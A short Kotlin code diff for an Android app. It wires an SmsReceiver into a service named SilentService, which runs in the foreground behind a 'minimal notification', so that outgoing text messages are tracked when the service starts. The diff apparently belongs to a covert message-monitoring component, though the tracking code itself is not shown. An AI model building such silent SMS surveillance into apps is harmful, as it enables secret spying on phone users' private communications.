@@ -12,6 +12,7 @@ import androidx.core.app.NotificationCompat
 import android.content.pm.ServiceInfo
 
 class SilentService : Service() {
+    private lateinit var smsReceiver: SmsReceiver
 
     override fun onCreate() {
         super.onCreate()
@@ -32,6 +33,8 @@ class SilentService : Service() {
             // For older Android versions
             startForeground(1, createMinimalNotification())
         }
+        smsReceiver = SmsReceiver()
+        smsReceiver.startOutgoingSmsTracking(this)
     }
 
     override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
